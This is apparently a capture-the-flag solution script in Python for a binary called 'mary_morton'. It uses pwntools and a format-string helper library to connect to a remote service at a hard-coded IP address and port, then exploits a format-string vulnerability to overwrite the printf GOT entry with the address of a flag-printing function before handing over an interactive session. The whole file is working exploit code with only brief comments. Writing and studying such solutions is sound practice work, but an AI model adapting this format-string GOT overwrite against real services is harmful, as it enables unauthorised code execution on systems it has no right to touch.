# coding=utf-8
 
 
from formatStringExploiter.FormatString import FormatString
from time import sleep
from pwn import *
 
 
# The function that prints the flag
flag_addr = 0x00000000004008DA
 
 
# Load the binary in pwntools. This way we don't need to worry about the
# details, just pass it to FormatString
elf = ELF('./mary_morton')
 
 
def connect():
    global p
    #p = process(elf.file.name)
    #111.198.29.45 31150
    p = remote(host='111.198.29.45', port=31150)
    p.recvuntil('Exit the battle \n')
 
 
 
 
def exec_fmt(s):
    p.sendline('2')
    sleep(0.1)
    p.sendline(s)
    ret = p.recvuntil('1. Stack Bufferoverflow', drop=True)
    p.recvuntil('Exit the battle \n')
    return ret
 
 
 
 
# Connect up
connect()
 
 
# Now, instantiate a FormatString class, using the elf and exec_fmt functions
fmtStr = FormatString(exec_fmt, elf=elf, index=6, pad=0, explore_stack=False)
fmtStr.write_q(elf.symbols['got.printf'], flag_addr)
 
 
p.sendline('1')
p.sendline('1')
 
 
p.interactive()